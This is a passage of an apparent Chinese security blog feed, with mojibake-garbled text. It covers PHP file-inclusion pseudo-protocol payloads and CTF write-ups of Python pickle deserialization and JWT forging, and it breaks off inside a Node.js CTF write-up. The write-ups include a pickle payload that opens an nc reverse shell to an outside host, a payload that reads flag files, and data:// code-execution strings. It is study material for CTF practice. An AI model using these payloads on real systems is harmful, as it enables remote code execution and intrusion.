//mysqlé…ç½®æ–‡ä»¶</li></ul><h2 id="è¿œç¨‹æ–‡ä»¶åŒ…å«-RFI"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«-RFI" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)</h2><p>å¦‚æœPHPçš„é…ç½®é€‰é¡¹<code>allow_url_include</code>ã€<code>allow_url_fopen</code>çŠ¶æ€ä¸ºONçš„è¯ï¼Œåˆ™<strong>include/require</strong>å‡½æ•°æ˜¯å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶çš„ï¼Œè¿™ç§æ¼æ´è¢«ç§°ä¸ºè¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)</p><p>é¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$path</span> . <span class="string">&#x27;/phpinfo.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®æœ¬åœ°siteç›®å½•ä¸‹çš„phpinfo.phpæ–‡ä»¶:</p><p><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/file_03.png" alt=""></p><p>è¯¥é¡µé¢å¹¶æ²¡æœ‰å¯¹$pathåšä»»ä½•è¿‡æ»¤ï¼Œå› æ­¤å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><p>æˆ‘ä»¬åœ¨è¿œç«¯WebæœåŠ¡å™¨/site/ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªtest.phpæ–‡ä»¶ï¼Œå†…å®¹ä¸ºphpinfo()ï¼Œåˆ©ç”¨æ¼æ´å»è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼ŒæˆåŠŸè¯»å–test.phpå¦‚ä¸‹ï¼š</p><p><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/file_04.png" alt=""></p><p>å¦‚æœtest.phpæ˜¯æ¶æ„çš„webshellæ–‡ä»¶ï¼Œé‚£ä¹ˆåˆ©ç”¨è¯¥æ¼æ´å°±å¯ä»¥è·å–åˆ°æœåŠ¡å™¨æƒé™</p><h1 id="PHPä¼ªåè®®"><a href="#PHPä¼ªåè®®" class="headerlink" title="PHPä¼ªåè®®"></a>PHPä¼ªåè®®</h1><p>PHPå†…ç½®äº†å¾ˆå¤šURLé£æ ¼çš„å°è£…åè®®ï¼Œå¯ç”¨äºç±»ä¼¼<code>fopen()ã€copy()ã€file_exists()å’Œfilesize()</code>çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</p><p>å¦‚ä¸‹æ‰€ç¤º</p><div class="table-container"><table><thead><tr><th>åç§°</th><th>æè¿°</th></tr></thead><tbody><tr><td>file://</td><td>è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</td></tr><tr><td>http://</td><td>è®¿é—®HTTP(s)ç½‘å€</td></tr><tr><td>ftp://</td><td>è®¿é—®FTP(s)URLs</td></tr><tr><td>php://</td><td>è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰</td></tr><tr><td>zlib://</td><td>å‹ç¼©æµ</td></tr><tr><td>data://</td><td>æ•°æ®ï¼ˆRFC 2397ï¼‰</td></tr><tr><td>glob://</td><td>æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ ¼å¼</td></tr></tbody></table></div><h2 id="file-åè®®"><a href="#file-åè®®" class="headerlink" title="file://åè®®"></a>file://åè®®</h2><p><code>file://</code> ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å—<code>allow_url_fopen</code>ä¸<code>allow_url_include</code>çš„å½±å“</p><p>ä½¿ç”¨æ–¹æ³•ï¼š<code>file:// [æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]</code></p><p><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/file_05.png" alt=""></p><h2 id="php-åè®®"><a href="#php-åè®®" class="headerlink" title="php://åè®®"></a>php://åè®®</h2><p>php:// è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯<code>php://filter</code>å’Œ<code>php://input</code><br><code>php://filter</code> ç”¨äºè¯»å–æºç <br><code>php://input</code> ç”¨äºæ‰§è¡Œphpä»£ç </p><p><code>php://filter</code>  è¯»å–æºä»£ç å¹¶è¿›è¡Œbase64ç¼–ç è¾“å‡ºï¼Œä¸ç„¶ä¼šç›´æ¥å½“åšphpä»£ç æ‰§è¡Œå°±çœ‹ä¸åˆ°æºä»£ç å†…å®¹äº†</p><p><strong>åˆ©ç”¨æ¡ä»¶:</strong></p><ul><li><code>allow_url_fopen</code> ï¼šoff/on</li><li><code>allow_url_include</code>ï¼šoff/on</li></ul><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“ä»–ä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œ</p><div class="table-container"><table><thead><tr><th>åç§°</th><th>æè¿°</th></tr></thead><tbody><tr><td>resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</td><td>è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</td></tr><tr><td>read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ`</td><td>`ï¼‰åˆ†éš”ã€‚</td></tr><tr><td>write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ`</td><td>`ï¼‰åˆ†éš”ã€‚</td></tr><tr><td>&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>ä»»ä½•æ²¡æœ‰ä»¥ <code>read=</code> æˆ– <code>write=</code> ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td></tr></tbody></table></div><p>å¸¸ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br><span class="line">php:<span class="comment">//filter/resource=index.php</span></span><br><span class="line"></span><br><span class="line">convert.base64-encodeè¿‡æ»¤å™¨</span><br></pre></td></tr></table></figure><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><code>php://input</code> å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ, å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸º<code>php://input</code>ï¼ŒåŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ</p><p><strong>æ³¨æ„ï¼š</strong><br>å½“<code>enctype=&quot;multipart/form-data&quot;</code>çš„æ—¶å€™<code>php://input</code>æ˜¯æ— æ•ˆçš„<br>é‡åˆ°<code>file_get_contents()</code>è¦æƒ³åˆ°ç”¨<code>php://input</code>ç»•è¿‡</p><h2 id="ZIP-åè®®"><a href="#ZIP-åè®®" class="headerlink" title="ZIP://åè®®"></a>ZIP://åè®®</h2><p><code>zip://</code> å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œ<code>zip://</code>æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œ</p><ul><li><code>zip://</code>ä¸­åªèƒ½ä¼ å…¥ç»å¯¹è·¯å¾„ã€‚</li><li>è¦ç”¨<code>#</code>åˆ†å‰²å‹ç¼©åŒ…å’Œå‹ç¼©åŒ…é‡Œçš„å†…å®¹ï¼Œå¹¶ä¸”<code>#</code>è¦ç”¨urlç¼–ç æˆ<code>%23(</code>å³ä¸‹è¿°POCä¸­<code>#</code>è¦ç”¨<code>%23</code>æ›¿æ¢ï¼‰</li><li>åªéœ€è¦æ˜¯zipçš„å‹ç¼©åŒ…å³å¯ï¼Œåç¼€åå¯ä»¥ä»»æ„æ›´æ”¹ã€‚</li><li>ç›¸åŒçš„ç±»å‹è¿˜æœ‰<code>zlib://</code>å’Œ<code>bzip2://</code></li></ul><p><strong>åˆ©ç”¨æ¡ä»¶:</strong></p><ul><li><code>allow_url_fopen</code> ï¼šoff/on</li><li><code>allow_url_include</code>ï¼šoff/on</li></ul><p>POCä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip:<span class="comment">//[å‹ç¼©åŒ…ç»å¯¹è·¯å¾„]#[å‹ç¼©åŒ…å†…æ–‡ä»¶]</span></span><br></pre></td></tr></table></figure><h2 id="data-åè®®"><a href="#data-åè®®" class="headerlink" title="data://åè®®"></a>data://åè®®</h2><p><code>data://</code> åŒæ ·ç±»ä¼¼ä¸<code>php://input</code>ï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„<code>data://</code>æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ</p><p>åˆ©ç”¨<code>data://</code> ä¼ªåè®®å¯ä»¥ç›´æ¥è¾¾åˆ°æ‰§è¡Œphpä»£ç çš„æ•ˆæœï¼Œä¾‹å¦‚æ‰§è¡Œ<code>phpinfo()</code>å‡½æ•°</p><p><strong>åˆ©ç”¨æ¡ä»¶:</strong></p><ul><li><code>allow_url_fopen</code> ï¼šon</li><li><code>allow_url_include</code>ï¼šon</li></ul><p>POCä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,&lt;?php phpinfo();?&gt;</span></span><br><span class="line"><span class="comment">//å¦‚æœæ­¤å¤„å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡base64ç¼–ç åå†è¾“å…¥ï¼š</span></span><br><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br></pre></td></tr></table></figure><p>ä¸¾ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// æ‰“å° &quot;I love PHP&quot;</span></span><br><span class="line"><span class="keyword">echo</span>  <span class="title function_ invoke__">file_get_contents</span> ( <span class="string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span> );</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://segmentfault.com/a/1190000018991087">PHPä¼ªåè®®æ€»ç»“</a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonååºåˆ—åŒ– wp</title>
      <link href="/2023/08/05/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20wp/"/>
      <url>/2023/08/05/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20wp/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h1><p>æ‰“å¼€åå‘ç°æ˜¯ä¸€ä¸ªç®€å•çš„è´­ç‰©ç•Œé¢ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡æœ‰å¯ç”¨ä¿¡æ¯ï¼Œå°è¯•æ‰«ç›®å½•ï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/python.png" alt=""></p><p>æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œå°è¯•æŠ“åŒ…ï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/python_01.png" alt=""></p><p>æ„Ÿè§‰cookieå€¼åƒæŸç§ç¼–ç ï¼Œå°è¯•è§£ç ï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/python_02.png" alt=""></p><p>æ²¡æœ‰è§£ç æˆåŠŸï¼Œç»“åˆé¢˜ç›®ï¼Œå¯çŸ¥æ˜¯å…³äºpickleçš„pythonååºåˆ—åŒ–ï¼Œå°è¯•å°†è§£ç åçš„æ•°æ®ååºåˆ—åŒ–ä¸€ä¸‹ï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/python_03.png" alt=""></p><p>å‘ç°è¯¥å¤„å­˜åœ¨pytohnååºåˆ—åŒ–ï¼Œå°è¯•åˆ©ç”¨ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p>å‘ç°æ²¡æœ‰å›æ˜¾ï¼Œå°è¯•åå¼¹shellï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc vpsip port -e/bin/sh&#x27;)&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p>vpsä¸Šç›‘å¬6666ç«¯å£ï¼š<code>nc -lvp port</code></p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/python_04.png" alt=""></p><p>åˆ©ç”¨bpå°†ç¼–ç åçš„paylaodå‘é€</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/python_05.png" alt="">åå¼¹shellæˆåŠŸï¼Œå¾—åˆ°flagï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/python_06.png" alt=""></p><h1 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h1><p>æ‰“å¼€åå‘ç°å¦‚ä¸‹ç•Œé¢ï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun.png" alt=""></p><p>æ³¨å†Œè´¦å·ç™»é™†ä¸€ä¸‹ï¼Œåœ¨ä¸»é¡µé¢å‘ç°hintï¼Œè®©æˆ‘ä»¬ä¸€å®šè¦åˆ°lv6ï¼Œé‚£æˆ‘ä»¬å°±å»ä¹°ï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_01.png" alt=""></p><p>æµè§ˆäº†å‡ é¡µï¼Œå‘ç°æ²¡æ‰¾åˆ°ï¼Œå°è¯•pythonè„šæœ¬å¯»æ‰¾ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://c1526858-2f99-427f-8512-f7ed026fe515.node4.buuoj.cn:81/shop?page=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">p_url = url+<span class="built_in">str</span>(i)</span><br><span class="line">params = &#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=p_url,params=params)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(p_url)</span><br></pre></td></tr></table></figure><p>å‘ç°ç»“æœï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_02.png" alt=""></p><p>è®¿é—®æ­¤é¡µé¢ï¼Œè´­ä¹°æ­¤ç‰©å“ï¼Œå‘ç°é’±ä¸å¤Ÿ<code>O.o</code>ï¼ŒbpæŠ“åŒ…ä¿®æ”¹é‡‘é¢ï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_03.png" alt=""></p><p>å‘ç°ä¸è¡Œï¼Œåªèƒ½ä¿®æ”¹æŠ˜æ‰£äº†ï¼Œå°†æŠ˜æ‰£æ”¹çš„å¾ˆå°å¾ˆå°</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_04.png" alt=""></p><p>å‘ç°hintï¼š<code>/b1g_m4mber</code>ï¼Œè®¿é—®ï¼Œå‘ç°æ­¤é¡µé¢åªè®©adminè®¿é—®ï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_14.png" alt=""></p><p>çœ‹bpæŠ“çš„åŒ…ï¼Œå‘ç°jwtå­˜åœ¨ï¼Œå°è¯•è§£ç ï¼š</p><ul><li><a href="https://jwt.io/">jwtåœ¨çº¿ç½‘ç«™</a></li></ul><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_05.png" alt=""></p><p>å¯ä»¥é€šè¿‡ä¼ªé€ jwtï¼Œæ¥å®ç°adminç™»å½•ï¼Œé€šè¿‡jwtå·¥å…·ï¼Œçˆ†ç ´å¯†é’¥ï¼š</p><ul><li><a href="https://github.com/brendan-rius/c-jwt-cracker">jwtçˆ†ç ´å¯†é’¥å·¥å…·</a></li></ul><p>çˆ†ç ´æˆåŠŸ</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_06.png" alt=""></p><p>ä¼ªé€ jwtï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_07.png" alt=""></p><p>ä¼ªé€ æˆåŠŸï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_08.png" alt=""></p><p>æ”¾åŒ…åæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°hintï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_09.png" alt=""></p><p>ä¸‹è½½æºç ä¹‹åï¼ŒæŸ¥çœ‹ï¼Œå‘ç°åœ¨<code>Admin.py</code>æ–‡ä»¶å‘ç°å¯ä»¥æ•°æ®ï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_10.png" alt=""></p><p>è¯¥å˜é‡å­˜åœ¨pythonååºåˆ—åŒ–æ¼æ´ï¼Œæ„é€ payloadï¼ŒæŠ“åŒ…ä¿®æ”¹<code>become</code>çš„å€¼ï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_11.png" alt=""></p><p>å‘ç°ä¸è¡Œï¼ŒæŸ¥çœ‹æºç å‘ç°<code>become</code>è¢«<code>hidden</code></p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_12.png" alt=""></p><p>å°†æ­¤æ ‡ç­¾å±æ€§åˆ é™¤ï¼Œé‡æ–°æŠ“åŒ…ï¼š</p><p>æ„é€ payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line">a = pickle.dumps(a)</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>å°†payloadä¼ è¿›å»ï¼Œå¾—åˆ°flag</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/ikun_13.png" alt=""></p><h1 id="SUCTF-2019-guess-game"><a href="#SUCTF-2019-guess-game" class="headerlink" title="SUCTF-2019:guess_game"></a>SUCTF-2019:guess_game</h1><p>è¿˜æ²¡æ‰¾åˆ°é¢˜ç›®åœ¨å“ªã€‚ã€‚ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW Nodejs</title>
      <link href="/2023/08/03/CTFSHOW%20Nodejs/"/>
      <url>/2023/08/03/CTFSHOW%20Nodejs/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web334-å¤§å°å†™ç‰¹æ€§"><a href="#web334-å¤§å°å†™ç‰¹æ€§" class="headerlink" title="web334(å¤§å°å†™ç‰¹æ€§)"></a>web334(å¤§å°å†™ç‰¹æ€§)</h1><p>å‘ç°æœ‰ä¸ªé™„ä»¶ï¼Œä¸‹è½½å‘ç°æ—¶ä¸¤ä¸ªjsæ–‡ä»¶ï¼š</p><p><strong>login.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> users = <span class="built_in">require</span>(<span class="string">&#x27;../modules/user&#x27;</span>).<span class="property">items</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="title function_">findUser</span>(req.<span class="property">body</span>.<span class="property">username</span>, req.<span class="property">body</span>.<span class="property">password</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(user)&#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="title function_">regenerate</span>(<span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>&#125;);        </span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">      req.<span class="property">session</span>.<span class="property">loginUser</span> = user.<span class="property">username</span>;</span><br><span class="line">      res.<span class="title function_">json</span>(&#123;<span 